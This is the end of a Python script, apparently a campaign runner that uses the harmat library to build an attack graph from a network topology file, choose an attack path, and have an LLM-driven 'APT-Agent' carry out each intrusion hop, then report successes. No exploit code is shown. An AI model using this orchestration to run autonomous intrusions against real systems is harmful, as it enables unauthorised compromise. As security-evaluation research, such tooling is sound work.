    parser = argparse.ArgumentParser(description="harmat + APT-Agent campaign runner")
    parser.add_argument("--topology", required=True, help="Topology JSON file")
    parser.add_argument("--strategy", choices=["max_risk", "shortest"], default="max_risk")
    parser.add_argument("--model",   default=None, help="LLM model override")
    parser.add_argument("--agent",   default=os.path.join(os.path.dirname(__file__), "APT-Agent.py"))
    parser.add_argument("--output-dir", default="results/harmat")
    parser.add_argument("--local-ip",   default=None)
    parser.add_argument("--dry-run",    action="store_true")
    args = parser.parse_args()

    with open(args.topology) as f:
        topology = json.load(f)

    if not topology.get("goal"):
        sys.exit("[ERROR] Topology JSON must contain a 'goal' field.")

    # ── harmat builds the attack graph and finds paths ──────────────────────
    ag, node_map, edge_meta = build_harmat_graph(topology)
    path = select_path(ag, node_map, args.strategy)

    def _safe(fn):
        try:    return fn()
        except: return "n/a"

    NAS  = _safe(ag.number_of_attack_paths)
    risk = _safe(lambda: round(ag.risk, 3))
    ROA  = _safe(lambda: round(ag.return_on_attack(), 3))
    AIM  = _safe(lambda: round(ag.impact, 3))

    all_cvss = [e.get("cvss", 0) for e in topology.get("edges", [])]
    n = len(all_cvss) or 1
    high_pct = round(100 * sum(1 for c in all_cvss if c >= 7.0) / n, 1)

    print(f"\nStrategy : {args.strategy}")
    print(f"Path     : {' → '.join(path)}")
    print(f"Hops     : {len(path) - 1}")
    print(f"Model    : {args.model or os.environ.get('LLM_MODEL', 'gpt-4o')}")
    print(f"harmat   : NAS={NAS}  AIM={AIM}  ROA={ROA}  risk={risk}  "
          f"High-severity={high_pct}%")

    if args.dry_run:
        print("\n[DRY RUN] Exiting."); return

    if not os.path.exists(args.agent):
        sys.exit(f"[ERROR] Agent not found: {args.agent}")

    # ── APT-Agent executes each hop ─────────────────────────────────────────
    campaign_start = time.time()
    results = run_campaign(path, edge_meta, args.agent, args.model, args.local_ip)

    successes = sum(1 for r in results if r["success"])
    total_s   = round(time.time() - campaign_start, 1)
    print(f"\n{'='*60}")
    print(f"  Campaign: {successes}/{len(results)} hops succeeded  "
          f"elapsed={total_s:.0f}s")
    print(f"  Path: {' → '.join(path)}")
    print(f"{'='*60}")

    write_report(results, path, args.strategy, args.model, ag, args.output_dir,
                 campaign_start_time=campaign_start, topology=topology)


if __name__ == "__main__":
    main()
